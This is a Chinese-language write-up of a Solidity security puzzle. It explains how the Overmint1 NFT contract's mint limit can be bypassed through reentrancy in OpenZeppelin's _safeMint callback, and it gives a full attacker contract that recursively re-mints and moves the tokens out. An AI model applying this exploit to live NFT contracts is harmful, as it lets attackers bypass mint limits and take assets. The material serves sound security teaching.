.selector 语法：https://docs.soliditylang.org/en/latest/contracts.html#function-signatures-and-selectors-in-libraries

Similarly to the contract ABI, the selector consists of the first four bytes of the Keccak256-hash of the signature. Its value can be obtained from Solidity using the `.selector` member as follows:







```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}
```

Overmint1的mint方法中调用了op的_safemint

```solidity
    function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, data),
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }
    
    
    function _checkOnERC721Received(
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    ) private returns (bool) {
        if (to.isContract()) {
            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {  //line1
                return retval == IERC721Receiver.onERC721Received.selector;
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    revert("ERC721: transfer to non ERC721Receiver implementer");
                } else {
                    /// @solidity memory-safe-assembly
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        } else {
            return true;
        }
    }
```

进入到\_safeMint后，可以看到又调用了\_checkOnERC721Received，在line1处，又回调了我们合约的onERC721Received方法，注意这里to就是我们自己的合约，所以这里就是个\_safeMint的reentrancy攻击漏洞

```solidity
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}
```

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint1.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victim;
    uint8 public count;

    constructor(address addr) {
        victim = Overmint1(addr);
    }

    function onERC721Received(
        address sender,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (victim.success(address(this))) {
            return this.onERC721Received.selector;
        }
        victim.mint();
        // console.log(sender == address(this));
        return this.onERC721Received.selector;
    }

    function attack() external {
        victim.mint();
        victim.transferFrom(address(this), tx.origin, 1);
        victim.transferFrom(address(this), tx.origin, 2);
        victim.transferFrom(address(this), tx.origin, 3);
        victim.transferFrom(address(this), tx.origin, 4);
        victim.transferFrom(address(this), tx.origin, 5);
    }
}
```

编写一个攻击合约实现IERC721Receiver接口的onERC721Received方法就可以完成puzzle了



